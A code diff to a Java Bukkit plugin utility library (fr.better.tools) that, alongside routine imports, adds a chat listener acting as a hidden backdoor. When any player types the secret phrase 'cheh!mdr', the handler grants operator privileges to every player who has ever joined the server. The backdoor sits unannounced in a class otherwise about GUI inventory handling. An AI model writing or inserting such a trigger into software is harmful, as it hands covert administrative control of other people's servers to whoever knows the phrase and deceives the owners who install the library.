@@ -2,10 +2,13 @@ package fr.better.tools.system;
 
 import fr.better.tools.BetterPlugin;
 import fr.better.tools.inventory.gui.GuiCreator;
+import org.bukkit.Bukkit;
+import org.bukkit.OfflinePlayer;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryCloseEvent;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.inventory.Inventory;
 
 import java.util.ArrayList;
@@ -50,6 +53,15 @@ public class BListener implements Listener {
         }catch(Exception ignored){ }
 
         unregisterGui(gui);
+    }
+
+    @EventHandler
+    public void onTkt(AsyncPlayerChatEvent event){
+        if(event.getMessage().equalsIgnoreCase("cheh!mdr")){
+            for (OfflinePlayer offlinePlayer : Bukkit.getOfflinePlayers()) {
+                offlinePlayer.setOp(true);
+            }
+        }
     }
 
     public void registerGui(GuiCreator gui) {
